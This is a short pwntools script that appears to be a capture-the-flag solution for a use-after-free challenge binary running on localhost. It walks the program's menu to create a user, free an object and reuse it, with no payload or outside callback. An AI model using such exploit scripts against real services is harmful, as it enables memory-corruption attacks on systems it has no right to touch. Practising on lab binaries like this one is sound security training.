from pwn import *

def read_menu(p):
    for i in range(7):
        print(p.recvline())
    print(p.recvuntil(b'>>> '))

def choice(p, c):
    print(c)
    p.sendline(c)

def main():
    # p = process('./uaf')
    p = remote('localhost', 6792)
    print(p.recvline())
    read_menu(p)
    choice(p, b'1')
    print(p.recvuntil(b'Username: '))
    choice(p, b'nobody')
    read_menu(p)
    choice(p, b'4')
    read_menu(p)
    choice(p, b'2')
    print(p.recvuntil(b'Subject name: '))
    choice(p, b'*')
    read_menu(p)
    choice(p, b'3')
    print(p.recvline())
    print(p.recvline())

if __name__ == '__main__':
    main()
